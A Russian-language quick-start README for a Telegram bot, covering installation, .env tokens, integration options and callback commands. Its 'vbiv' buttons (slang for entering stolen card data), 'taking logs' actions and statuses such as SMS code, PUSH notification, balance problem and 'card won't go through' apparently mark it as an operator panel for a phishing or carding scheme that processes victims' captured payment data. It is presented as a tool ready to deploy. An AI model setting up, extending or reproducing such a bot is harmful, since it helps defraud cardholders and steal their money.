# Быстрый старт

## 1. Установка зависимостей
```bash
npm install
```

## 2. Настройка переменных окружения
Скопируйте `env.example` в `.env` и заполните:
```bash
cp env.example .env
```

Отредактируйте `.env`:
```env
BOT_TOKEN=ваш_токен_бота
LOGS_GROUP_ID=id_группы_логов
LOGGING_GROUP_ID=id_группы_логирования
```

## 3. Запуск
```bash
npm start
```

## Интеграция в существующий проект

### Вариант 1: Полная интеграция
Скопируйте всю папку `telegram-bot-archive` в ваш проект и следуйте инструкциям выше.

### Вариант 2: Частичная интеграция
Скопируйте только необходимые файлы:
- `bot.js` - основной файл бота
- `config/` - конфигурация
- `handlers/` - обработчики
- `models/` - модели данных
- `locale/` - локализация

### Вариант 3: Модульная интеграция
Импортируйте только нужные функции:
```javascript
const { Telegraf } = require('telegraf');
const config = require('./path/to/config/config');
const vbivButtons = require('./path/to/handlers/functions/vbivButtons');

const bot = new Telegraf(config.bot.token);
// Ваша логика
```

## Основные функции бота

- **Взятие логов**: `log_take_<id>`
- **Отказ от лога**: `log_<id>_leave`
- **Изменение статуса**: `log_<id>_setStatus_<status>`
- **Проверка онлайн**: `eye_<id>`
- **Кастомные сцены**: `custom_<id>`, `customError_<id>`

## Статусы логов
- `success` - Успех
- `sms` - SMS код
- `push` - PUSH уведомление
- `card` - Проблема с картой
- `balance` - Проблема с балансом
- `skip` - Не бьется
- `change` - Сменить карту
- `custom` - Кастомный вопрос
- `customError` - Кастомная ошибка
